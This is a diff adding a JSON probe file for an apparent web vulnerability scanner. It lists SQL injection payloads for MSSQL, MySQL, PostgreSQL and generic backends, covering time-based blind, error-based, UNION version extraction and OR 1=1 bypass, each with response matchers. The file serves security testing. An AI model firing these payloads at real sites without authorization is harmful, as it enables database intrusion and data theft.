@@ -1,0 +1,189 @@
+{
+  "category": "sqli",
+  "contexts": {
+    "mssql": {
+      "description": "SQL injection probes targeting Microsoft SQL Server via IIS/ASP.NET stacks",
+      "tech_match": ["IIS", "ASP.NET", "MSSQL"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger MSSQL syntax error",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["unclosed quotation", "incorrect syntax", "ole db"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; WAITFOR DELAY '0:0:{{sleep}}'--",
+          "description": "MSSQL time-based blind injection via WAITFOR DELAY",
+          "matchers": [
+            {"type": "timing", "min_ms": 4000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+          "description": "MSSQL error-based injection via CONVERT type mismatch",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["conversion failed", "microsoft sql"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT 1--",
+          "description": "Stacked query probe for MSSQL",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["incorrect syntax", "ole db", "sql server"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        }
+      ]
+    },
+    "mysql": {
+      "description": "SQL injection probes targeting MySQL via Apache/PHP/Nginx stacks",
+      "tech_match": ["Apache", "PHP", "MySQL", "Nginx"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger MySQL syntax error",
+          "matchers": [
+            {"type": "status", "status": [500]},
+            {"type": "word", "words": ["sql syntax", "mysql", "warning:"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND SLEEP({{sleep}})--",
+          "description": "MySQL time-based blind injection via SLEEP",
+          "matchers": [
+            {"type": "timing", "min_ms": 4000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT NULL,NULL,NULL--",
+          "description": "MySQL UNION-based column count probe",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 200}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=2 UNION SELECT 1,version(),3--",
+          "description": "MySQL version extraction via UNION",
+          "matchers": [
+            {"type": "regex", "pattern": "[0-9]+\\.[0-9]+\\.[0-9]+"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' OR '1'='1",
+          "description": "Classic MySQL OR 1=1 authentication bypass",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 200}
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        }
+      ]
+    },
+    "postgresql": {
+      "description": "SQL injection probes targeting PostgreSQL",
+      "tech_match": ["PostgreSQL"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger PostgreSQL syntax error",
+          "matchers": [
+            {"type": "word", "words": ["pg_query", "unterminated", "syntax error"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT pg_sleep({{sleep}})--",
+          "description": "PostgreSQL time-based blind injection via pg_sleep",
+          "matchers": [
+            {"type": "timing", "min_ms": 4000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=CAST('a' AS integer)--",
+          "description": "PostgreSQL error-based injection via invalid CAST",
+          "matchers": [
+            {"type": "word", "words": ["invalid input syntax", "integer"], "condition": "and"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND 1=1--",
+          "description": "PostgreSQL boolean-based true condition",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 0},
+            {"type": "not_word", "words": ["error", "exception"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 20,
+          "variables": {}
+        }
+      ]
+    },
+    "generic": {
+      "description": "Generic SQL injection probes for unknown or mixed database backends",
+      "tech_match": [],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger generic SQL error",
+          "matchers": [
+            {"type": "status", "status": [500]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 25,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} OR 1=1--",
+          "description": "Classic OR 1=1 to expand result set",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 200}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
